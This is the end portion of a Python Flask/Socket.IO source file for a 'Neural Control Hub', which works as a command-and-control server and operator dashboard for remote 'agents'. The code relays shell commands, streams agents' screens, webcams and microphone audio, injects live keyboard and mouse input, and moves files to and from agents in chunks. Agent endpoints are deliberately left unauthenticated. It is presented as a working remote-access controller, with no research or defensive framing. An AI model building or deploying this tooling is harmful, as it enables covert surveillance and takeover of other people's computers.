            document.getElementById('agent-id').value = agentId;
            
            // Clear terminal and show agent selection message
            const outputDisplay = document.getElementById('output-display');
            const timestamp = new Date().toLocaleTimeString();
            outputDisplay.textContent = `[${timestamp}] Agent ${agentId.substring(0,8)}... selected. Ready for commands.\n[${timestamp}] Terminal initialized. Type commands below.\n`;
            outputDisplay.scrollTop = outputDisplay.scrollHeight;
            
            document.getElementById('command-status').style.display = 'none';
        }

        function updateAgentList(agents) {
            const agentList = document.getElementById('agent-list');
            agentList.innerHTML = '';

            if (Object.keys(agents).length === 0) {
                agentList.innerHTML = `
                    <div class="no-agents">
                        <div class="no-agents-icon">🤖</div>
                        <div>No agents connected</div>
                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
                    </div>
                `;
                return;
            }

            for (const agentId in agents) {
                const agent = agents[agentId];
                const agentCard = document.createElement('div');
                agentCard.className = 'agent-card';
                agentCard.onclick = () => selectAgent(agentCard, agentId);
                
                const lastSeen = new Date(agent.last_seen).toLocaleString();
                agentCard.innerHTML = `
                    <div class="agent-status"></div>
                    <div class="agent-id">${agentId.substring(0, 8)}...</div>
                    <div class="agent-info">Last seen: ${lastSeen}</div>
                `;
                
                if (agentId === selectedAgentId) {
                    agentCard.classList.add('selected');
                }
                
                agentList.appendChild(agentCard);
            }
        }

        // --- Command & Control ---
        function issueCommand() {
            const command = document.getElementById('command').value;
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }
            if (!command) {
                showStatus('Please enter a command.', 'error');
                return;
            }

            const outputDisplay = document.getElementById('output-display');
            const currentContent = outputDisplay.textContent;
            const timestamp = new Date().toLocaleTimeString();
            const newContent = currentContent + `\n[${timestamp}] > ${command}\n[${timestamp}] Executing...\n`;
            outputDisplay.textContent = newContent;
            outputDisplay.scrollTop = outputDisplay.scrollHeight;
            
            socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
            document.getElementById('command').value = '';
        }

        function clearTerminal() {
            const outputDisplay = document.getElementById('output-display');
            const timestamp = new Date().toLocaleTimeString();
            outputDisplay.textContent = `[${timestamp}] Terminal cleared. System ready. Awaiting commands...`;
            outputDisplay.scrollTop = outputDisplay.scrollHeight;
        }

        function showCurrentDirectory() {
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }
            issueCommandInternal(selectedAgentId, 'pwd');
        }

        function issueCommandInternal(agentId, command) {
            if (!agentId) return;
            socket.emit('execute_command', { agent_id: agentId, command: command });
        }

        // --- Streaming ---
        function startScreenStream() {
            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }
            
            issueCommandInternal(selectedAgentId, 'start-stream');
            issueCommandInternal(selectedAgentId, 'start-audio');

            if (videoWindow && !videoWindow.closed) videoWindow.close();
            videoWindow = window.open(`/video_feed/${selectedAgentId}`, `LiveStream_${selectedAgentId}`, 'width=800,height=600');

            audioPlayer = document.getElementById('audio-player');
            audioPlayer.src = `/audio_feed/${selectedAgentId}`;
            audioPlayer.style.display = 'block';
            audioPlayer.play();
            
            showStatus('Screen stream started', 'success');
        }

        function startCameraStream() {
            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }

            issueCommandInternal(selectedAgentId, 'start-camera');
            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
            cameraWindow = window.open(`/camera_feed/${selectedAgentId}`, `CameraStream_${selectedAgentId}`, 'width=640,height=480');
            showStatus('Camera stream started', 'success');
        }

        function stopAllStreams() {
            if (selectedAgentId) {
                issueCommandInternal(selectedAgentId, 'stop-stream');
                issueCommandInternal(selectedAgentId, 'stop-audio');
                issueCommandInternal(selectedAgentId, 'stop-camera');
            }
            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
                audioPlayer.style.display = 'none';
            }
            if (videoWindow && !videoWindow.closed) videoWindow.close();
            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
            
            showStatus('All streams stopped', 'success');
        }

        function listProcesses() {
            document.getElementById('command').value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
            issueCommand();
        }

        function showStatus(message, type) {
            const statusDiv = document.getElementById('command-status');
            statusDiv.style.display = 'block';
            statusDiv.className = `status-indicator status-${type}`;
            statusDiv.textContent = message;
            setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
        }

        // --- Socket.IO Event Handlers ---
        socket.on('connect', () => {
            console.log('Connected to controller');
            socket.emit('operator_connect'); // Announce presence as an operator
        });

        socket.on('disconnect', () => {
            console.log('Disconnected from controller');
        });

        socket.on('agent_list_update', (agents) => {
            updateAgentList(agents);
        });

        socket.on('command_output', (data) => {
            console.log('🔍 Main-controller: command_output received:', data);
            if (data.agent_id === selectedAgentId) {
                const outputDisplay = document.getElementById('output-display');
                // Append new output, keeping previous content
                const currentContent = outputDisplay.textContent;
                const timestamp = new Date().toLocaleTimeString();
                const newContent = currentContent + `\n[${timestamp}] ${data.output}`;
                outputDisplay.textContent = newContent;
                outputDisplay.scrollTop = outputDisplay.scrollHeight; // Scroll to bottom
                console.log('🔍 Main-controller: Output updated in terminal');
            } else {
                console.log('🔍 Main-controller: Command output for different agent:', data.agent_id, 'Selected:', selectedAgentId);
            }
        });

        socket.on('status_update', (data) => {
            showStatus(data.message, data.type);
        });

        // Add key listener to command input
        let commandHistory = [];
        let historyIndex = -1;

        document.getElementById('command').addEventListener('keyup', function(event) {
            if (event.key === 'Enter') {
                const command = this.value.trim();
                if (command) {
                    commandHistory.push(command);
                    historyIndex = commandHistory.length;
                }
                issueCommand();
            } else if (event.key === 'ArrowUp') {
                event.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = commandHistory[historyIndex];
                }
            } else if (event.key === 'ArrowDown') {
                event.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                } else {
                    historyIndex = commandHistory.length;
                    this.value = '';
                }
            }
        });

        // Configuration status management
        function refreshConfigStatus() {
            fetch('/config-status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('admin-password-status').textContent = 
                        data.admin_password_set ? `Set (${data.admin_password_length} chars)` : 'Not set';
                    document.getElementById('hash-algorithm').textContent = 
                        `${data.password_hash_algorithm} (${data.hash_iterations} iterations)`;
                    document.getElementById('session-timeout').textContent = 
                        `${data.session_timeout} seconds`;
                    document.getElementById('max-login-attempts').textContent = 
                        data.max_login_attempts.toString();
                    document.getElementById('blocked-ips').textContent = 
                        data.blocked_ips.length > 0 ? data.blocked_ips.join(', ') : 'None';
                })
                .catch(error => {
                    console.error('Error fetching config status:', error);
                    document.getElementById('admin-password-status').textContent = 'Error';
                    document.getElementById('hash-algorithm').textContent = 'Error';
                    document.getElementById('session-timeout').textContent = 'Error';
                    document.getElementById('max-login-attempts').textContent = 'Error';
                    document.getElementById('blocked-ips').textContent = 'Error';
                });
        }

        // Load config status on page load
        document.addEventListener('DOMContentLoaded', function() {
            refreshConfigStatus();
        });

        // Password management functions
        function changePassword() {
            const currentPassword = document.getElementById('current-password').value;
            const newPassword = document.getElementById('new-password').value;
            const confirmPassword = document.getElementById('confirm-password').value;
            const statusDiv = document.getElementById('password-change-status');

            // Validation
            if (!currentPassword || !newPassword || !confirmPassword) {
                showPasswordStatus('Please fill in all password fields.', 'error');
                return;
            }

            if (newPassword.length < 8) {
                showPasswordStatus('New password must be at least 8 characters long.', 'error');
                return;
            }

            if (newPassword !== confirmPassword) {
                showPasswordStatus('New passwords do not match.', 'error');
                return;
            }

            // Send password change request
            fetch('/change-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    current_password: currentPassword,
                    new_password: newPassword
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showPasswordStatus('Password changed successfully!', 'success');
                    // Clear form
                    document.getElementById('current-password').value = '';
                    document.getElementById('new-password').value = '';
                    document.getElementById('confirm-password').value = '';
                    // Refresh config status
                    refreshConfigStatus();
                } else {
                    showPasswordStatus(data.message, 'error');
                }
            })
            .catch(error => {
                showPasswordStatus('Error changing password: ' + error.message, 'error');
            });
        }

        function showPasswordStatus(message, type) {
            const statusDiv = document.getElementById('password-change-status');
            statusDiv.style.display = 'block';
            statusDiv.className = `status-indicator status-${type}`;
            statusDiv.textContent = message;
            setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
        }

        // Password strength indicator
        function checkPasswordStrength(password) {
            let strength = 0;
            if (password.length >= 8) strength++;
            if (/[a-z]/.test(password)) strength++;
            if (/[A-Z]/.test(password)) strength++;
            if (/[0-9]/.test(password)) strength++;
            if (/[^A-Za-z0-9]/.test(password)) strength++;
            
            if (strength < 3) return 'weak';
            if (strength < 5) return 'medium';
            return 'strong';
        }

        // Add password strength indicator
        document.getElementById('new-password').addEventListener('input', function() {
            const password = this.value;
            const strength = checkPasswordStrength(password);
            const strengthDiv = this.parentNode.querySelector('.password-strength');
            
            if (strengthDiv) {
                strengthDiv.remove();
            }
            
            if (password.length > 0) {
                const div = document.createElement('div');
                div.className = `password-strength password-${strength}`;
                div.textContent = `Password strength: ${strength.charAt(0).toUpperCase() + strength.slice(1)}`;
                this.parentNode.appendChild(div);
            }
        });

        // --- Live Keyboard Event Listeners ---
        const liveKeyboardInput = document.getElementById('live-keyboard-input');
        const liveMouseArea = document.getElementById('live-mouse-area');

        liveKeyboardInput.addEventListener('keydown', (event) => {
            if (!selectedAgentId) return;
            event.preventDefault();
            socket.emit('live_key_press', {
                agent_id: selectedAgentId,
                event_type: 'down',
                key: event.key,
                code: event.code,
                shift: event.shiftKey,
                ctrl: event.ctrlKey,
                alt: event.altKey,
                meta: event.metaKey
            });
        });

        liveKeyboardInput.addEventListener('keyup', (event) => {
            if (!selectedAgentId) return;
            event.preventDefault();
            socket.emit('live_key_press', {
                agent_id: selectedAgentId,
                event_type: 'up',
                key: event.key,
                code: event.code
            });
        });
        liveMouseArea.addEventListener('mousemove', (event) => {
            if (!selectedAgentId) return;

            // Get the coordinates relative to the mouse area
            const rect = liveMouseArea.getBoundingClientRect();
            const x = event.clientX - rect.left;
            const y = event.clientY - rect.top;

            socket.emit('live_mouse_move', {
                agent_id: selectedAgentId,
                x: x,
                y: y
            });
        });

        liveMouseArea.addEventListener('mousedown', (event) => {
            if (!selectedAgentId) return;

            const button = document.getElementById('mouse-button').value;

            socket.emit('live_mouse_click', {
                agent_id: selectedAgentId,
                event_type: 'down',
                button: button
            });
        });

        liveMouseArea.addEventListener('mouseup', (event) => {
            if (!selectedAgentId) return;

            const button = document.getElementById('mouse-button').value;

            socket.emit('live_mouse_click', {
                agent_id: selectedAgentId,
                event_type: 'up',
                button: button
            });
        });

        // --- File Transfer (Chunked) ---
        let fileChunks = {};

        function uploadFile() {
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }
            const fileInput = document.getElementById('upload-file');
            const file = fileInput.files[0];

            if (!file) {
                showStatus('Please select a file to upload.', 'error');
                return;
            }

            const CHUNK_SIZE = 1024 * 512; // 512KB
            let offset = 0;

            showStatus(`Starting upload of ${file.name}...`, 'success');
            const reader = new FileReader();

            function readSlice(o) {
                const slice = file.slice(o, o + CHUNK_SIZE);
                reader.readAsDataURL(slice);
            }

            reader.onload = function(e) {
                const chunk = e.target.result;
                const agentUploadPath = document.getElementById('agent-upload-path').value;
                socket.emit('upload_file_chunk', {
                    agent_id: selectedAgentId,
                    filename: file.name,
                    data: chunk,
                    offset: offset,
                    destination_path: agentUploadPath
                });
                
                // Estimate offset for progress. Note: base64 is larger.
                // A more accurate progress would require more complex calculations.
                offset += CHUNK_SIZE; 
                if (offset > file.size) offset = file.size;

                showFileTransferProgress(file.name, offset, file.size, 'Uploading');

                if (offset < file.size) {
                    readSlice(offset);
                } else {
                    socket.emit('upload_file_end', {
                        agent_id: selectedAgentId,
                        filename: file.name
                    });
                    showStatus(`File ${file.name} upload complete.`, 'success');
                }
            };
            readSlice(0);
        }

        function downloadFile() {
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }
            const filename = document.getElementById('download-filename').value;
            if (!filename) {
                showStatus('Please enter a filename to download.', 'error');
                return;
            }
            fileChunks[filename] = []; // Reset chunks
            const localPath = document.getElementById('local-download-path').value;
            socket.emit('download_file', {
                agent_id: selectedAgentId,
                filename: filename,
                local_path: localPath
            });
            showStatus(`Requesting ${filename} from agent...`, 'success');
        }

        function showFileTransferProgress(filename, loaded, total, action) {
            const progress = total > 0 ? Math.round((loaded / total) * 100) : 100;
            const statusDiv = document.getElementById('file-transfer-status');
            statusDiv.style.display = 'block';
            statusDiv.className = 'status-indicator status-success';
            statusDiv.textContent = `${action} ${filename}: ${progress}%`;
             if (progress >= 100) {
                setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
            }
        }

        socket.on('file_download_chunk', (data) => {
            if (data.agent_id !== selectedAgentId) return;

            const { filename, chunk, offset, total_size, error } = data;

            if (error) {
                showStatus(`Error downloading ${filename}: ${error}`, 'error');
                if(fileChunks[filename]) delete fileChunks[filename];
                return;
            }

            if (!fileChunks[filename]) {
                fileChunks[filename] = [];
            }
            
            try {
                const byteString = atob(chunk.split(',')[1]);
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                fileChunks[filename].push(ia);
            } catch (e) {
                showStatus(`Error processing chunk for ${filename}: ${e}`, 'error');
                delete fileChunks[filename];
                return;
            }

            const loaded = fileChunks[filename].reduce((acc, curr) => acc + curr.length, 0);
            showFileTransferProgress(filename, loaded, total_size, 'Downloading');

            if (loaded >= total_size) {
                const blob = new Blob(fileChunks[filename], { type: 'application/octet-stream' });
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = filename;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                showStatus(`Downloaded ${filename}.`, 'success');
                delete fileChunks[filename];
            }
        });


    </script>
</body>
</html>
'''

# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})

# Remove the agent secret authentication - allow direct agent access
# AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")

# def require_agent_secret(f):
#     def decorated(*args, **kwargs):
#         if request.headers.get("X-AGENT-SECRET") != AGENT_SHARED_SECRET:
#             return "Forbidden", 403
#         return f(*args, **kwargs)
#     decorated.__name__ = f.__name__
#     return decorated

# --- Operator-facing endpoints ---

@app.route("/")
def index():
    if is_authenticated():
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard")
@require_auth
def dashboard():
    return DASHBOARD_HTML

# --- Real-time Streaming Endpoints (unchanged) ---

VIDEO_FRAMES = defaultdict(lambda: None)
CAMERA_FRAMES = defaultdict(lambda: None)
AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())

@app.route('/stream/<agent_id>', methods=['POST'])
# No authentication required for agent ingestion
def stream_in(agent_id):
    VIDEO_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_video_frames(agent_id):
    while True:
        frame = VIDEO_FRAMES.get(agent_id)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        else:
            time.sleep(0.05)

@app.route('/video_feed/<agent_id>')
@require_auth
def video_feed(agent_id):
    return Response(generate_video_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/camera/<agent_id>', methods=['POST'])
# No authentication required for agent ingestion
def camera_in(agent_id):
    CAMERA_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_camera_frames(agent_id):
    while True:
        frame = CAMERA_FRAMES.get(agent_id)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        else:
            time.sleep(0.05)

@app.route('/camera_feed/<agent_id>')
@require_auth
def camera_feed(agent_id):
    return Response(generate_camera_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/audio/<agent_id>', methods=['POST'])
# No authentication required for agent ingestion
def audio_in(agent_id):
    AUDIO_CHUNKS[agent_id].put(request.data)
    return "OK", 200

def generate_audio_stream(agent_id):
    q = AUDIO_CHUNKS[agent_id]
    # WAV header for PCM 16-bit mono 44100Hz
    import struct
    sample_rate = 44100
    bits_per_sample = 16
    num_channels = 1
    byte_rate = sample_rate * num_channels * bits_per_sample // 8
    block_align = num_channels * bits_per_sample // 8
    # Set a large data size for streaming (e.g., 0x7FFFFFFF)
    data_size = 0x7FFFFFFF
    wav_header = b'RIFF' + struct.pack('<I', 36 + data_size) + b'WAVEfmt ' + struct.pack('<I', 16) + struct.pack('<H', 1) + struct.pack('<H', num_channels) + struct.pack('<I', sample_rate) + struct.pack('<I', byte_rate) + struct.pack('<H', block_align) + struct.pack('<H', bits_per_sample) + b'data' + struct.pack('<I', data_size)
    yield wav_header
    while True:
        try:
            chunk = q.get(timeout=1)
            yield chunk
        except queue.Empty:
            continue

@app.route('/audio_feed/<agent_id>')
@require_auth
def audio_feed(agent_id):
    return Response(generate_audio_stream(agent_id), mimetype='audio/wav')

# --- Socket.IO Event Handlers ---

@socketio.on('connect')
def handle_connect():
    # Note: Socket.IO doesn't have direct access to Flask session
    # In a production environment, you'd want to implement proper Socket.IO authentication
    # For now, we'll allow connections but validate on specific events
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            break
    if disconnected_agent_id:
        del AGENTS_DATA[disconnected_agent_id]
        emit('agent_list_update', AGENTS_DATA, broadcast=True)
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")

@socketio.on('operator_connect')
def handle_operator_connect():
    """When a web dashboard connects."""
    join_room('operators')
    emit('agent_list_update', AGENTS_DATA) # Send current agent list to the new operator
    print("Operator dashboard connected.")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    agent_id = data.get('agent_id')
    if not agent_id:
        return
    
    AGENTS_DATA[agent_id]["sid"] = request.sid
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
    
    # Notify all operators of the new agent
    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
    print(f"Agent {agent_id} connected with SID {request.sid}")

@socketio.on('execute_command')
def handle_execute_command(data):
    """Operator issues a command to an agent."""
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('command', {'command': command}, room=agent_sid)
        print(f"Sent command '{command}' to agent {agent_id}")
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)

@socketio.on('command_result')
def handle_command_result(data):
    """Agent sends back the result of a command."""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
    print(f"Received output from {agent_id}: {output[:100]}...")

@socketio.on('live_key_press')
def handle_live_key_press(data):
    """Operator sends a live key press to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('key_press', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_move')
def handle_live_mouse_move(data):
    """Operator sends a live mouse move to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_move', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_click')
def handle_live_mouse_click(data):
    """Operator sends a live mouse click to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_click', data, room=agent_sid, include_self=False)

# --- Chunked File Transfer Handlers ---
@socketio.on('upload_file_chunk')
def handle_upload_file_chunk(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('data')
    offset = data.get('offset')
    destination_path = data.get('destination_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_chunk_from_operator', {
            'filename': filename,
            'data': chunk,
            'offset': offset,
            'destination_path': destination_path
        }, room=agent_sid)

@socketio.on('upload_file_end')
def handle_upload_file_end(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_upload_complete_from_operator', data, room=agent_sid)
        print(f"Upload of {data.get('filename')} to {agent_id} complete.")

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    local_path = data.get('local_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
        DOWNLOAD_BUFFERS[filename]["local_path"] = local_path # Store local path
        emit('request_file_chunk_from_agent', {'filename': filename}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)

@socketio.on('file_chunk_from_agent')
def handle_file_chunk_from_agent(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size')
    error = data.get('error')

    if error:
        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': error}, room='operators')
        if filename in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[filename]
        return

    if filename not in DOWNLOAD_BUFFERS:
        DOWNLOAD_BUFFERS[filename] = {"chunks": [], "total_size": total_size, "local_path": None}

    DOWNLOAD_BUFFERS[filename]["chunks"].append(base64.b64decode(chunk.split(',')[1]))
    DOWNLOAD_BUFFERS[filename]["total_size"] = total_size # Update total size in case it was not set initially

    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[filename]["chunks"])

    # If all chunks received, save the file locally
    if current_download_size >= total_size:
        full_content = b"".join(DOWNLOAD_BUFFERS[filename]["chunks"])
        local_path = DOWNLOAD_BUFFERS[filename]["local_path"]

        if local_path:
            try:
                # Ensure directory exists
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(full_content)
                print(f"Successfully downloaded {filename} to {local_path}")
                emit('file_download_chunk', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'chunk': chunk,
                    'offset': offset,
                    'total_size': total_size,
                    'local_path': local_path # Pass local_path back to frontend
                }, room='operators')
            except Exception as e:
                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
        else:
            # If no local_path was specified, send the chunks to the frontend for browser download
            emit('file_download_chunk', {
                'agent_id': agent_id,
                'filename': filename,
                'chunk': chunk,
                'offset': offset,
                'total_size': total_size
            }, room='operators')
        
        del DOWNLOAD_BUFFERS[filename]
    else:
        # Continue sending chunks to frontend for progress update
        emit('file_download_chunk', {
            'agent_id': agent_id,
            'filename': filename,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room='operators')



if __name__ == "__main__":
    print("Starting Neural Control Hub with Socket.IO support...")
    print(f"Admin password: {Config.ADMIN_PASSWORD}")
    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
    print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
    print(f"Salt length: {Config.SALT_LENGTH} bytes")
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)
